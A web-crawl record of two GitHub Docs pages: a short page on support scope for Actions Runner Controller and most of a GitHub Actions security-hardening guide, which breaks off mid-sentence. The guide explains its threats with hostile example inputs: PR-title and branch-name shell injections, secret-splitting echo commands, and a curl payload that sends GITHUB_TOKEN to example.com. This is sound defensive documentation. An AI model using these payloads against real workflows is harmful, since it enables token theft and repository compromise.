  "url": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller",
    "loadedTime": "2025-05-08T06:37:00.408Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller",
    "title": "About support for Actions Runner Controller - GitHub Docs",
    "description": "What to know before you contact GitHub Support for assistance with Actions Runner Controller.",
    "author": null,
    "keywords": "Actions Runner Controller,Support",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "About support for Actions Runner Controller - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/about-support-for-actions-runner-controller"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E683:BCC10:7D5C:9F9A:681C5107",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:36:55 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686216.526337, VS0, VE292",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "25416",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "About support for Actions Runner Controller\nWhat to know before you contact GitHub Support for assistance with Actions Runner Controller.\nYou can contact GitHub Support for assistance with Actions Runner Controller.\nAbout support for Actions Runner Controller Versions\nThe Actions Runner Controller (ARC) project was adopted by GitHub to release as a new GitHub product. As a result, there are currently two ARC releases: the legacy community-maintained ARC and GitHub's Autoscaling Runner Sets.\nGitHub only supports the latest Autoscaling Runner Sets version of ARC. Support for the legacy ARC is provided by the community in the Actions Runner Controller repository only.\nScope of support for Actions Runner Controller\nIf your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:\nThe legacy community-maintained version of ARC\nInstalling, configuring, or maintaining dependencies\nTemplate spec customization\nContainer orchestration, such as Kubernetes setup, networking, building images in ARC (DinD), etc.\nApplying Kubernetes policies\nManaged Kubernetes providers or provider-specific configurations\nRunner Container Hooks in conjunction with ARC's kubernetes mode\nInstallation tooling other than Helm\nStorage provisioners and PersistentVolumeClaims (PVCs)\nBest practices, such as configuring metrics servers, image caching, etc.\nWhile ARC may be deployed successfully with different tooling and configurations, your support request is possibly out of GitHub Support's scope if ARC has been deployed with:\nInstallation tooling other than Helm\nService account and/or template spec customization\nIf you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed.\nFor more information about contacting GitHub Support, see Contacting GitHub Support.\nNote\nOpenShift clusters are currently unsupported.\nARC is only supported on GitHub Enterprise Server versions 3.9 and greater.\nWorking with GitHub Support for Actions Runner Controller\nGitHub Support may ask questions about your Actions Runner Controller deployment and request that you collect and attach the controller, listener, and runner logs to the support ticket.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn-ghj2g.html",
  "markdown": "# About support for Actions Runner Controller\n\nWhat to know before you [contact GitHub Support](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/support/contacting-github-support) for assistance with Actions Runner Controller.\n\nYou can [contact GitHub Support](https://docs.github.com/en/support/contacting-github-support) for assistance with Actions Runner Controller.\n\n## [About support for Actions Runner Controller Versions](#about-support-for-actions-runner-controller-versions)\n\nThe Actions Runner Controller (ARC) project [was adopted by GitHub](https://github.com/actions/actions-runner-controller/discussions/2072) to release as a new GitHub product. As a result, there are currently two ARC releases: the legacy community-maintained ARC and GitHub's Autoscaling Runner Sets.\n\nGitHub only supports the latest Autoscaling Runner Sets version of ARC. Support for the legacy ARC is provided by the community in the [Actions Runner Controller](https://github.com/actions/actions-runner-controller) repository only.\n\n## [Scope of support for Actions Runner Controller](#scope-of-support-for-actions-runner-controller)\n\nIf your support request is outside of the scope of what our team can help you with, we may recommend next steps to resolve your issue outside of GitHub Support. Your support request is possibly out of GitHub Support's scope if the request is primarily about:\n\n*   The legacy community-maintained version of ARC\n*   Installing, configuring, or maintaining dependencies\n*   Template spec customization\n*   Container orchestration, such as Kubernetes setup, networking, building images in ARC (DinD), etc.\n*   Applying Kubernetes policies\n*   Managed Kubernetes providers or provider-specific configurations\n*   [Runner Container Hooks](https://github.com/actions/runner-container-hooks) in conjunction with ARC's `kubernetes` mode\n*   Installation tooling other than Helm\n*   Storage provisioners and PersistentVolumeClaims (PVCs)\n*   Best practices, such as configuring metrics servers, image caching, etc.\n\nWhile ARC may be deployed successfully with different tooling and configurations, your support request is possibly out of GitHub Support's scope if ARC has been deployed with:\n\n*   Installation tooling other than Helm\n*   Service account and/or template spec customization\n\nIf you're uncertain if the issue is out of scope, open a ticket and we're happy to help you determine the best way to proceed.\n\nFor more information about contacting GitHub Support, see [Contacting GitHub Support](https://docs.github.com/en/support/contacting-github-support).\n\nNote\n\n*   OpenShift clusters are currently unsupported.\n*   ARC is only supported on GitHub Enterprise Server versions 3.9 and greater.\n\n## [Working with GitHub Support for Actions Runner Controller](#working-with-github-support-for-actions-runner-controller)\n\nGitHub Support may ask questions about your Actions Runner Controller deployment and request that you collect and attach the [controller, listener](https://docs.github.com/en/actions/hosting-your-own-runners/managing-self-hosted-runners-with-actions-runner-controller/troubleshooting-actions-runner-controller-errors#checking-the-logs-of-the-controller-and-runner-set-listener), and runner logs to the support ticket.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 240,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-hosting-your-own-runners-managing-self-hosted-runners-with-actions-runner-controller-about-support-for-actions-runn"
    },
    "lengths": {
      "extractus": 4436,
      "readableText": 4059,
      "none": 25146,
      "readableTextIfPossible": 25146,
      "result": 4059,
      "markdown": 3331
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
    "loadedTime": "2025-05-08T06:36:59.026Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions",
    "title": "Security hardening for GitHub Actions - GitHub Docs",
    "description": "Good security practices for using GitHub Actions features.",
    "author": null,
    "keywords": "Security",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Security hardening for GitHub Actions - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "113A:14FBA2:1D99:2986:681C5105",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:36:54 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21932-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686214.738589, VS0, VE782",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "39797",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Security hardening for GitHub Actions\nGood security practices for using GitHub Actions features.\nOverview\nThis guide explains how to configure security hardening for certain GitHub Actions features. If the GitHub Actions concepts are unfamiliar, see Understanding GitHub Actions.\nUsing secrets\nSensitive values should never be stored as plaintext in workflow files, but rather as secrets. Secrets can be configured at the organization, repository, or environment level, and allow you to store sensitive information in GitHub.\nSecrets use Libsodium sealed boxes, so that they are encrypted before reaching GitHub. This occurs when the secret is submitted using the UI or through the REST API. This client-side encryption helps minimize the risks related to accidental logging (for example, exception logs and request logs, among others) within GitHub's infrastructure. Once the secret is uploaded, GitHub is then able to decrypt it so that it can be injected into the workflow runtime.\nTo help prevent accidental disclosure, GitHub uses a mechanism that attempts to redact any secrets that appear in run logs. This redaction looks for exact matches of any configured secrets used within the job, as well as common encodings of the values, such as Base64. However, because there are multiple ways a secret value can be transformed, this redaction is not guaranteed. Additionally, the runner can only redact secrets used within the current job. As a result, there are certain proactive steps and good practices you should follow to help ensure secrets are redacted, and to limit other risks associated with secrets:\nNever use structured data as a secret \nStructured data can cause secret redaction within logs to fail, because redaction largely relies on finding an exact match for the specific secret value. For example, do not use a blob of JSON, XML, or YAML (or similar) to encapsulate a secret value, as this significantly reduces the probability the secrets will be properly redacted. Instead, create individual secrets for each sensitive value.\nRegister all secrets used within workflows \nIf a secret is used to generate another sensitive value within a workflow, that generated value should be formally registered as a secret, so that it will be redacted if it ever appears in the logs. For example, if using a private key to generate a signed JWT to access a web API, be sure to register that JWT as a secret or else it won’t be redacted if it ever enters the log output.\nRegistering secrets applies to any sort of transformation/encoding as well. If your secret is transformed in some way (such as Base64 or URL-encoded), be sure to register the new value as a secret too.\nAudit how secrets are handled \nAudit how secrets are used, to help ensure they’re being handled as expected. You can do this by reviewing the source code of the repository executing the workflow, and checking any actions used in the workflow. For example, check that they’re not sent to unintended hosts, or explicitly being printed to log output.\nView the run logs for your workflow after testing valid/invalid inputs, and check that secrets are properly redacted, or not shown. It's not always obvious how a command or tool you’re invoking will send errors to STDOUT and STDERR, and secrets might subsequently end up in error logs. As a result, it is good practice to manually review the workflow logs after testing valid and invalid inputs. For information on how to clean up workflow logs that may unintentionally contain sensitive data, see Using workflow run logs.\nUse credentials that are minimally scoped \nMake sure the credentials being used within workflows have the least privileges required, and be mindful that any user with write access to your repository has read access to all secrets configured in your repository.\nActions can use the GITHUB_TOKEN by accessing it from the github.token context. For more information, see Accessing contextual information about workflow runs. You should therefore make sure that the GITHUB_TOKEN is granted the minimum required permissions. It's good security practice to set the default permission for the GITHUB_TOKEN to read access only for repository contents. The permissions can then be increased, as required, for individual jobs within the workflow file. For more information, see Automatic token authentication.\nAudit and rotate registered secrets \nPeriodically review the registered secrets to confirm they are still required. Remove those that are no longer needed.\nRotate secrets periodically to reduce the window of time during which a compromised secret is valid.\nConsider requiring review for access to secrets \nYou can use required reviewers to protect environment secrets. A workflow job cannot access environment secrets until approval is granted by a reviewer. For more information about storing secrets in environments or requiring reviews for environments, see Using secrets in GitHub Actions and Managing environments for deployment.\nWarning\nAny user with write access to your repository has read access to all secrets configured in your repository. Therefore, you should ensure that the credentials being used within workflows have the least privileges required.\nUsing CODEOWNERS to monitor changes\nYou can use the CODEOWNERS feature to control how changes are made to your workflow files. For example, if all your workflow files are stored in .github/workflows, you can add this directory to the code owners list, so that any proposed changes to these files will first require approval from a designated reviewer.\nFor more information, see About code owners.\nUnderstanding the risk of script injections\nWhen creating workflows, custom actions, and composite actions, you should always consider whether your code might execute untrusted input from attackers. This can occur when an attacker adds malicious commands and scripts to a context. When your workflow runs, those strings might be interpreted as code which is then executed on the runner.\nAttackers can add their own malicious content to the github context, which should be treated as potentially untrusted input. These contexts typically end with body, default_branch, email, head_ref, label, message, name, page_name,ref, and title. For example: github.event.issue.title, or github.event.pull_request.body.\nYou should ensure that these values do not flow directly into workflows, actions, API calls, or anywhere else where they could be interpreted as executable code. By adopting the same defensive programming posture you would use for any other privileged application code, you can help security harden your use of GitHub Actions. For information on some of the steps an attacker could take, see Security hardening for GitHub Actions.\nIn addition, there are other less obvious sources of potentially untrusted input, such as branch names and email addresses, which can be quite flexible in terms of their permitted content. For example, zzz\";echo${IFS}\"hello\";# would be a valid branch name and would be a possible attack vector for a target repository.\nThe following sections explain how you can help mitigate the risk of script injection.\nExample of a script injection attack\nA script injection attack can occur directly within a workflow's inline script. In the following example, an action uses an expression to test the validity of a pull request title, but also adds the risk of script injection:\n- name: Check PR title run: | title=\"${{ github.event.pull_request.title }}\" if [[ $title =~ ^octocat ]]; then echo \"PR title starts with 'octocat'\" exit 0 else echo \"PR title did not start with 'octocat'\" exit 1 fi \nThis example is vulnerable to script injection because the run command executes within a temporary shell script on the runner. Before the shell script is run, the expressions inside ${{ }} are evaluated and then substituted with the resulting values, which can make it vulnerable to shell command injection.\nTo inject commands into this workflow, the attacker could create a pull request with a title of a\"; ls $GITHUB_WORKSPACE\":\nIn this example, the \" character is used to interrupt the title=\"${{ github.event.pull_request.title }}\" statement, allowing the ls command to be executed on the runner. You can see the output of the ls command in the log:\nRun title=\"a\"; ls $GITHUB_WORKSPACE\"\" README.md code.yml example.js \nGood practices for mitigating script injection attacks\nThere are a number of different approaches available to help you mitigate the risk of script injection:\nUsing an action instead of an inline script (recommended)\nThe recommended approach is to create a JavaScript action that processes the context value as an argument. This approach is not vulnerable to the injection attack, since the context value is not used to generate a shell script, but is instead passed to the action as an argument:\nuses: fakeaction/checktitle@v3 with: title: ${{ github.event.pull_request.title }} \nUsing an intermediate environment variable\nFor inline scripts, the preferred approach to handling untrusted input is to set the value of the expression to an intermediate environment variable.\nThe following example uses Bash to process the github.event.pull_request.title value as an environment variable:\n- name: Check PR title env: TITLE: ${{ github.event.pull_request.title }} run: | if [[ \"$TITLE\" =~ ^octocat ]]; then echo \"PR title starts with 'octocat'\" exit 0 else echo \"PR title did not start with 'octocat'\" exit 1 fi \nIn this example, the attempted script injection is unsuccessful, which is reflected by the following lines in the log:\nenv: TITLE: a\"; ls $GITHUB_WORKSPACE\" PR title did not start with 'octocat' \nWith this approach, the value of the ${{ github.event.pull_request.title }} expression is stored in memory and used as a variable, and doesn't interact with the script generation process. In addition, consider using double quote shell variables to avoid word splitting, but this is one of many general recommendations for writing shell scripts, and is not specific to GitHub Actions.\nUsing workflow templates for code scanning\nCode scanning allows you to find security vulnerabilities before they reach production. GitHub provides workflow templates for code scanning. You can use these suggested workflows to construct your code scanning workflows, instead of starting from scratch. GitHub's workflow, the CodeQL analysis workflow, is powered by CodeQL. There are also third-party workflow templates available.\nFor more information, see About code scanning and Configuring advanced setup for code scanning.\nRestricting permissions for tokens\nTo help mitigate the risk of an exposed token, consider restricting the assigned permissions. For more information, see Automatic token authentication.\nUsing OpenID Connect to access cloud resources\nIf your GitHub Actions workflows need to access resources from a cloud provider that supports OpenID Connect (OIDC), you can configure your workflows to authenticate directly to the cloud provider. This will let you stop storing these credentials as long-lived secrets and provide other security benefits. For more information, see About security hardening with OpenID Connect.\nNote\nSupport for custom claims for OIDC is unavailable in AWS.\nUsing third-party actions\nThe individual jobs in a workflow can interact with (and compromise) other jobs. For example, a job querying the environment variables used by a later job, writing files to a shared directory that a later job processes, or even more directly by interacting with the Docker socket and inspecting other running containers and executing commands in them.\nThis means that a compromise of a single action within a workflow can be very significant, as that compromised action would have access to all secrets configured on your repository, and may be able to use the GITHUB_TOKEN to write to the repository. Consequently, there is significant risk in sourcing actions from third-party repositories on GitHub. For information on some of the steps an attacker could take, see Security hardening for GitHub Actions.\nYou can help mitigate this risk by following these good practices:\nPin actions to a full length commit SHA\nPinning an action to a full length commit SHA is currently the only way to use an action as an immutable release. Pinning to a particular SHA helps mitigate the risk of a bad actor adding a backdoor to the action's repository, as they would need to generate a SHA-1 collision for a valid Git object payload. When selecting a SHA, you should verify it is from the action's repository and not a repository fork.\nAudit the source code of the action\nEnsure that the action is handling the content of your repository and secrets as expected. For example, check that secrets are not sent to unintended hosts, or are not inadvertently logged.\nPin actions to a tag only if you trust the creator\nAlthough pinning to a commit SHA is the most secure option, specifying a tag is more convenient and is widely used. If you’d like to specify a tag, then be sure that you trust the action's creators. The ‘Verified creator’ badge on GitHub Marketplace is a useful signal, as it indicates that the action was written by a team whose identity has been verified by GitHub. Note that there is risk to this approach even if you trust the author, because a tag can be moved or deleted if a bad actor gains access to the repository storing the action.\nReusing third-party workflows\nThe same principles described above for using third-party actions also apply to using third-party workflows. You can help mitigate the risks associated with reusing workflows by following the same good practices outlined above. For more information, see Reusing workflows.\nUsing Dependabot version updates to keep actions up to date\nYou can use Dependabot to ensure that references to actions and reusable workflows used in your repository are kept up to date. Actions are often updated with bug fixes and new features to make automated processes faster, safer, and more reliable. Dependabot takes the effort out of maintaining your dependencies as it does this automatically for you. For more information, see Keeping your actions up to date with Dependabot and About Dependabot security updates.\nPreventing GitHub Actions from creating or approving pull requests\nYou can choose to allow or prevent GitHub Actions workflows from creating or approving pull requests. Allowing workflows, or any other automation, to create or approve pull requests could be a security risk if the pull request is merged without proper oversight.\nFor more information on how to configure this setting, see Disabling or limiting GitHub Actions for your organization, and Managing GitHub Actions settings for a repository.\nUsing code scanning to secure workflows\nCode scanning can automatically detect and suggest improvements for common vulnerable patterns used in GitHub Actions workflows. For more information on how to enable code scanning, see Configuring default setup for code scanning.\nUsing OpenSSF Scorecards to secure workflow dependencies\nScorecards is an automated security tool that flags risky supply chain practices. You can use the Scorecards action and workflow template to follow best security practices. Once configured, the Scorecards action runs automatically on repository changes, and alerts developers about risky supply chain practices using the built-in code scanning experience. The Scorecards project runs a number of checks, including script injection attacks, token permissions, and pinned actions.\nPotential impact of a compromised runner\nThese sections consider some of the steps an attacker can take if they're able to run malicious commands on a GitHub Actions runner.\nNote\nGitHub-hosted runners do not scan for malicious code downloaded by a user during their job, such as a compromised third party library.\nAccessing secrets\nWorkflows triggered from a forked repository using the pull_request event have read-only permissions and have no access to secrets. However, these permissions differ for various event triggers such as issue_comment, issues, push and pull_request from a branch within the repository, where the attacker could attempt to steal repository secrets or use the write permission of the job's GITHUB_TOKEN.\nIf the secret or token is set to an environment variable, it can be directly accessed through the environment using printenv.\nIf the secret is used directly in an expression, the generated shell script is stored on-disk and is accessible.\nFor a custom action, the risk can vary depending on how a program is using the secret it obtained from the argument:\nuses: fakeaction/publish@v3 with: key: ${{ secrets.PUBLISH_KEY }} \nAlthough GitHub Actions scrubs secrets from memory that are not referenced in the workflow (or an included action), the GITHUB_TOKEN and any referenced secrets can be harvested by a determined attacker.\nExfiltrating data from a runner\nAn attacker can exfiltrate any stolen secrets or other data from the runner. To help prevent accidental secret disclosure, GitHub Actions automatically redact secrets printed to the log, but this is not a true security boundary because secrets can be intentionally sent to the log. For example, obfuscated secrets can be exfiltrated using echo ${SOME_SECRET:0:4}; echo ${SOME_SECRET:4:200};. In addition, since the attacker may run arbitrary commands, they could use HTTP requests to send secrets or other repository data to an external server.\nStealing the job's GITHUB_TOKEN\nIt is possible for an attacker to steal a job's GITHUB_TOKEN. The GitHub Actions runner automatically receives a generated GITHUB_TOKEN with permissions that are limited to just the repository that contains the workflow, and the token expires after the job has completed. Once expired, the token is no longer useful to an attacker. To work around this limitation, they can automate the attack and perform it in fractions of a second by calling an attacker-controlled server with the token, for example: a\"; set +e; curl http://example.com?token=$GITHUB_TOKEN;#.\nModifying the contents of a repository\nThe attacker server can use the GitHub API to modify repository content, including releases, if the assigned permissions of GITHUB_TOKEN are not restricted.\nConsidering cross-repository access\nGitHub Actions is intentionally scoped for a single repository at a time. The GITHUB_TOKEN grants the same level of access as a write-access user, because any write-access user can access this token by creating or modifying a workflow file, elevating the permissions of the GITHUB_TOKEN if necessary. Users have specific permissions for each repository, so allowing the GITHUB_TOKEN for one repository to grant access to another would impact the GitHub permission model if not implemented carefully. Similarly, caution must be taken when adding GitHub authentication tokens to a workflow, because this can also affect the GitHub permission model by inadvertently granting broad access to collaborators.\nIf your organization is owned by an enterprise account, then you can share and reuse GitHub Actions by storing them in internal repositories. For more information, see Sharing actions and workflows with your enterprise.\nYou can perform other privileged, cross-repository interactions by referencing a GitHub authentication token or SSH key as a secret within the workflow. Because many authentication token types do not allow for granular access to specific resources, there is significant risk in using the wrong token type, as it can grant much broader access than intended.\nThis list describes the recommended approaches for accessing repository data within a workflow, in descending order of preference:\nThe GITHUB_TOKEN \nThis token is intentionally scoped to the single repository that invoked the workflow, and can have the same level of access as a write-access user on the repository. The token is created before each job begins and expires when the job is finished. For more information, see Automatic token authentication.\nThe GITHUB_TOKEN should be used whenever possible.\nRepository deploy key \nDeploy keys are one of the only credential types that grant read or write access to a single repository, and can be used to interact with another repository within a workflow. For more information, see Managing deploy keys.\nNote that deploy keys can only clone and push to the repository using Git, and cannot be used to interact with the REST or GraphQL API, so they may not be appropriate for your requirements.\nGitHub App tokens \nGitHub Apps can be installed on select repositories, and even have granular permissions on the resources within them. You could create a GitHub App internal to your organization, install it on the repositories you need access to within your workflow, and authenticate as the installation within your workflow to access those repositories. For more information, see Making authenticated API requests with a GitHub App in a GitHub Actions workflow.\npersonal access tokens \nYou should never use a personal access token (classic). These tokens grant access to all repositories within the organizations that you have access to, as well as all personal repositories in your personal account. This indirectly grants broad access to all write-access users of the repository the workflow is in.\nIf you do use a personal access token, you should never use a personal access token from your own account. If you later leave an organization, workflows using this token will immediately break, and debugging this issue can be challenging. Instead, you should use a fine-grained personal access token for a new account that belongs to your organization and that is only granted access to the specific repositories that are needed for the workflow. Note that this approach is not scalable and should be avoided in favor of alternatives, such as deploy keys.\nSSH keys on a personal account \nWorkflows should never use the SSH keys on a personal account. Similar to personal access tokens (classic), they grant read/write permissions to all of your personal repositories as well as all the repositories you have access to through organization membership. This indirectly grants broad access to all write-access users of the repository the workflow is in. If you're intending to use an SSH key because you only need to perform repository clones or pushes, and do not need to interact with public APIs, then you should use individual deploy keys instead.\nHardening for GitHub-hosted runners\nGitHub-hosted runners take measures to help you mitigate security risks.\nReviewing the supply chain for GitHub-hosted runners\nFor GitHub-hosted runners created from images maintained by GitHub, you can view a software bill of materials (SBOM) to see what software was pre-installed on the runner. You can provide your users with the SBOM which they can run through a vulnerability scanner to validate if there are any vulnerabilities in the product. If you are building artifacts, you can include this SBOM in your bill of materials for a comprehensive list of everything that went into creating your software.\nSBOMs are available for Ubuntu, Windows, and macOS runner images maintained by GitHub. You can locate the SBOM for your build in the release assets at https://github.com/actions/runner-images/releases. An SBOM with a filename in the format of sbom.IMAGE-NAME.json.zip can be found in the attachments of each release.\nFor third-party images, such as the images for ARM-powered runners, you can find details of the software that's included in the image in the actions/partner-runner-images repository.\nDenying access to hosts\nGitHub-hosted runners are provisioned with an etc/hosts file that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk. For more information, see Using GitHub-hosted runners.\nHardening for self-hosted runners\nGitHub-hosted runners execute code within ephemeral and clean isolated virtual machines, meaning there is no way to persistently compromise this environment, or otherwise gain access to more information than was placed in this environment during the bootstrap process.\nSelf-hosted runners for GitHub do not have guarantees around running in ephemeral clean virtual machines, and can be persistently compromised by untrusted code in a workflow.\nAs a result, self-hosted runners should almost never be used for public repositories on GitHub, because any user can open pull requests against the repository and compromise the environment. Similarly, be cautious when using self-hosted runners on private or internal repositories, as anyone who can fork the repository and open a pull request (generally those with read access to the repository) are able to compromise the self-hosted runner environment, including gaining access to secrets and the GITHUB_TOKEN which, depending on its settings, can grant write access to the repository. Although workflows can control access to environment secrets by using environments and required reviews, these workflows are not run in an isolated environment and are still susceptible to the same risks when run on a self-hosted runner.\nOrganization owners can choose which repositories are allowed to create repository-level self-hosted runners.\nFor more information, see Disabling or limiting GitHub Actions for your organization.\nWhen a self-hosted runner is defined at the organization or enterprise level, GitHub can schedule workflows from multiple repositories onto the same runner. Consequently, a security compromise of these environments can result in a wide impact. To help reduce the scope of a compromise, you can create boundaries by organizing your self-hosted runners into separate groups. You can restrict what organizations and repositories can access runner groups. For more information, see Managing access to self-hosted runners using groups.\nYou should also consider the environment of the self-hosted runner machines:\nWhat sensitive information resides on the machine configured as a self-hosted runner? For example, private SSH keys, API access tokens, among others.\nDoes the machine have network access to sensitive services? For example, Azure or AWS metadata services. The amount of sensitive information in this environment should be kept to a minimum, and you should always be mindful that any user capable of invoking workflows has access to this environment.\nSome customers might attempt to partially mitigate these risks by implementing systems that automatically destroy the self-hosted runner after each job execution. However, this approach might not be as effective as intended, as there is no way to guarantee that a self-hosted runner only runs one job. Some jobs will use secrets as command-line arguments which can be seen by another job running on the same runner, such as ps x -w. This can lead to secret leakages.\nUsing just-in-time runners\nTo improve runner registration security, you can use the REST API to create ephemeral, just-in-time (JIT) runners. These self-hosted runners perform at most one job before being automatically removed from the repository, organization, or enterprise. For more information about configuring JIT runners, see REST API endpoints for self-hosted runners.\nNote\nRe-using hardware to host JIT runners can risk exposing information from the environment. Use automation to ensure the JIT runner uses a clean environment. For more information, see Autoscaling with self-hosted runners.\nOnce you have the config file from the REST API response, you can pass it to the runner at startup.\n./run.sh --jitconfig ${encoded_jit_config} \nPlanning your management strategy for self-hosted runners\nA self-hosted runner can be added to various levels in your GitHub hierarchy: the enterprise, organization, or repository level. This placement determines who will be able to manage the runner:\nCentralized management:\nIf you plan to have a centralized team own the self-hosted runners, then the recommendation is to add your runners at the highest mutual organization or enterprise level. This gives your team a single location to view and manage your runners.\nIf you only have a single organization, then adding your runners at the organization level is effectively the same approach, but you might encounter difficulties if you add another organization in the 